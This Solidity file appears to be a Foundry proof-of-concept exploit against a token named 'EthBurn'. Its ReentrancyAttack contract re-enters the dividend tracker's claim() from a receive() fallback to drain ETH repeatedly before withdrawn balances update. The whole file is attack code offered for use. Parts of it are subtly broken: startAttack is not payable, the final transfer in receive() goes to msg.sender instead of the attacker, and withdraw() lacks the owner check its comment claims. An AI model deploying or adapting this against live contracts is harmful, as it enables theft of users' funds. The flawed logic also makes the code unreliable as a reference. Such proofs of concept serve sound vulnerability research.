// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IEthBurn {
    function claim() external;
    function dividendTracker() external view returns (address);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function setIncludeDividends(address account) external;
    function setTrueDefiRouter(address _router) external;
    function owner() external view returns (address);
}

interface IDividendTracker {
    function processAccount(address payable account, bool automatic) external returns (bool);
    function withdrawableDividendOf(address account) external view returns (uint256);
    function withdrawnDividendOf(address account) external view returns (uint256);
    function distributeDividends() external payable;
}

contract ReentrancyAttack {
    IEthBurn public token;
    IDividendTracker public dividendTracker;
    uint256 public attackCount;
    uint256 public constant MAX_RECURSION = 10;

    constructor(address _token) {
        token = IEthBurn(_token);
        dividendTracker = IDividendTracker(token.dividendTracker());
    }

    function startAttack(uint256 triggerAmount) external {
        // Send ETH to dividend tracker to trigger distribution
        dividendTracker.distributeDividends{value: triggerAmount}();

        // Start the reentrancy by claiming dividends
        token.claim();
    }

    // Fallback function that gets called when ETH is sent
    receive() external payable {
        if (attackCount < MAX_RECURSION) {
            attackCount++;

            // Reenter by claiming dividends again
            // This works because withdrawnDividends hasn't been updated yet
            token.claim();
        }

        // After last recursion, transfer funds back to attacker
        if (attackCount >= MAX_RECURSION) {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    // Helper to check dividend amounts
    function getWithdrawableDividend() external view returns (uint256) {
        return dividendTracker.withdrawableDividendOf(address(this));
    }

    function getWithdrawnDividend() external view returns (uint256) {
        return dividendTracker.withdrawnDividendOf(address(this));
    }

    // Allow owner to withdraw any remaining ETH
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

